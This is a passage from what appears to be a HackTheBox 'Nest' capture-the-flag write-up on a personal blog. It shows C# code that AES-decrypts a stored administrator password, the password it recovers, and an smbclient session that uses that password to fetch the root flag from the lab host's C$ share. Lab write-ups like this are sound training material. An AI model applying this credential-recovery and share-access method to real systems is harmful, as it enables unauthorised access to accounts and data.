+				<span class=n>aesCryptoServiceProvider</span><span class=p>.</span><span class=n>Mode</span> <span class=o>=</span> <span class=n>CipherMode</span><span class=p>.</span><span class=n>CBC</span><span class=err>;</span>
+				<span class=n>ICryptoTransform</span> <span class=n>transform</span> <span class=o>=</span> <span class=n>aesCryptoServiceProvider</span><span class=p>.</span><span class=n>CreateDecryptor</span><span class=p>(</span><span class=n>bytes3</span><span class=p>,</span> <span class=n>bytes</span><span class=p>)</span><span class=err>;</span>
+				<span class=n>MemoryStream</span> <span class=n>memoryStream</span> <span class=o>=</span> <span class=k>new</span> <span class=n>MemoryStream</span><span class=p>(</span><span class=n>array</span><span class=p>)</span><span class=err>;</span>
+				<span class=n>CryptoStream</span> <span class=n>cryptoStream</span> <span class=o>=</span> <span class=k>new</span> <span class=n>CryptoStream</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>,</span> <span class=n>transform</span><span class=p>,</span> <span class=n>CryptoStreamMode</span><span class=p>.</span><span class=n>Read</span><span class=p>)</span><span class=err>;</span>
+				<span class=kt>byte</span><span class=o>[]</span> <span class=n>array2</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>byte</span><span class=o>[</span><span class=n>array</span><span class=p>.</span><span class=n>Length</span> <span class=o>+</span> <span class=n>1</span><span class=o>]</span><span class=err>;</span>
+				<span class=n>int</span> <span class=n>count</span> <span class=o>=</span> <span class=n>cryptoStream</span><span class=p>.</span><span class=n>Read</span><span class=p>(</span><span class=n>array2</span><span class=p>,</span> <span class=n>0</span><span class=p>,</span> <span class=n>array2</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span><span class=err>;</span>
+				<span class=n>memoryStream</span><span class=p>.</span><span class=n>Close</span><span class=p>()</span><span class=err>;</span>
+				<span class=n>cryptoStream</span><span class=p>.</span><span class=n>Close</span><span class=p>()</span><span class=err>;</span>
+				<span class=k>return</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetString</span><span class=p>(</span><span class=n>array2</span><span class=p>,</span> <span class=n>0</span><span class=p>,</span> <span class=n>count</span><span class=p>)</span><span class=err>;</span>
+			<span class=p>}</span>
+		<span class=p>}</span>
+		
+		<span class=k>public</span> <span class=n>void</span> <span class=n>Main</span><span class=p>()</span> <span class=p>{</span>
+			<span class=kt>string</span> <span class=n>encrypted</span> <span class=o>=</span> <span class=s>&#34;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=&#34;</span><span class=err>;</span>
+			<span class=n>System</span><span class=p>.</span><span class=n>Console</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=s>&#34;encrypted: &#34;</span> <span class=o>+</span> <span class=n>encrypted</span><span class=p>)</span><span class=err>;</span>
+			<span class=n>System</span><span class=p>.</span><span class=n>Console</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=s>&#34;decrypted: &#34;</span> <span class=o>+</span> <span class=n>DS</span><span class=p>(</span><span class=n>encrypted</span><span class=p>))</span><span class=err>;</span>
+		<span class=p>}</span>
+	<span class=p>}</span>
+<span class=p>}</span>
+</code></pre></div><p>Running our tool we get:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>encrypted: yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4<span class=o>=</span>
+decrypted: XtH4nkS4Pl4y1nGX
+</code></pre></div><h3 id=getting-the-root-flag>Getting the root flag <a href=#getting-the-root-flag>¶</a></h3><p>We use this password to login as the Administrator user and find the root flag in it&rsquo;s Desktop folder.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ smbclient -U Administrator <span class=se>\\\\</span>10.10.10.178<span class=se>\\</span>C$
+Unable to initialize messaging context
+Enter WORKGROUP<span class=se>\A</span>dministrator<span class=err>&#39;</span>s password: 
+Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class=se>\&gt;</span> <span class=nb>cd</span> Users<span class=se>\A</span>dministrator<span class=se>\D</span>esktop
+smb: <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\&gt;</span> ls
+  .                                  DR        <span class=m>0</span>  Sun Jan <span class=m>26</span> 08:20:50 <span class=m>2020</span>
+  ..                                 DR        <span class=m>0</span>  Sun Jan <span class=m>26</span> 08:20:50 <span class=m>2020</span>
+  desktop.ini                       AHS      <span class=m>282</span>  Sat Jan <span class=m>25</span> 23:02:44 <span class=m>2020</span>
+  root.txt                            A       <span class=m>32</span>  Tue Aug  <span class=m>6</span> 00:27:26 <span class=m>2019</span>
+
+		<span class=m>10485247</span> blocks of size 4096. <span class=m>6545151</span> blocks available
+smb: <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\&gt;</span> get root.txt
+getting file <span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop<span class=se>\r</span>oot.txt of size <span class=m>32</span> as root.txt <span class=o>(</span>0,3 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0,3 KiloBytes/sec<span class=o>)</span>
+
+$ cat root.txt 
+6594c2eb084bc0f08a42f0b94b878c41
+</code></pre></div><p>:)</p>
+</div>
+</article>
+<hr>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span class=tag><a href=https://sequr.be/tags/hackthebox.eu/>HackTheBox.eu</a></span>
+<span class=tag><a href=https://sequr.be/tags/vbscrub/>VbScrub</a></span>
+<span class=tag><a href=https://sequr.be/tags/machine/>Machine</a></span>
+<span class=tag><a href=https://sequr.be/tags/nest/>Nest</a></span>
+</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a href=https://sequr.be/categories/hack-the-box/>Hack The Box</a></span>
+<span class=tag><a href=https://sequr.be/categories/writeup/>Writeup</a></span>
+</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+3148 Words
+</p>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+2020-06-08
+</p>
+</div>
+<hr>
+<div class=sharing-buttons>
+<a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsequr.be%2fblog%2f2020%2f06%2fnest%2f" target=_blank rel=noopener aria-label title="Share on facebook">
+<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f06%2fnest%2f" target=_blank rel=noopener aria-label title="Share on twitter">
+<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f06%2fnest%2f&resubmit=true&title=Nest" target=_blank rel=noopener aria-label title="Share on reddit">
+<div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="whatsapp://send?text=Nest%20https%3a%2f%2fsequr.be%2fblog%2f2020%2f06%2fnest%2f" target=_blank rel=noopener aria-label title="Share on whatsapp">
+<div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg>
+</div>
+</div>
+</a>
+</div>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h></span>
+<hr>
+</div>
+<div class=pagination__buttons>
+<span class="button previous">
+<a href=https://sequr.be/blog/2020/06/gitlab-unauthenticated-group-and-project-enumeration/>
+<span class=button__icon>←</span>
+<span class=button__text>Gitlab unauthenticated group and project enumeration</span>
+</a>
+</span>
+<span class="button next">
+<a href=https://sequr.be/blog/2020/05/quickr/>
+<span class=button__text>QuickR</span>
+<span class=button__icon>→</span>
+</a>
+</span>
+</div>
+</div>
+</main>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=footer__content>
+<span>&copy; 2019-2021</span>
+<span><a href=https://sequr.be>DezeStijn</a></span>
+<span>
+<a href=https://sequr.be/blog/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg>
+</a>
+</span>
+</div>
+</div>
+<div class=footer__inner>
+<div class=footer__content>
+<small>
+<span>Powered by <a href='\"http://gohugo.io\"'>Hugo</a>.</span>
+<span>Made with &#10084; by <a href='\"https://github.com/rhazdon\"'>Djordje Atlialp</a></span>
+</small>
+</div>
+</div>
+</footer>
+</div>
+<script type=text/javascript src=https://sequr.be/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+</body>
+</html>
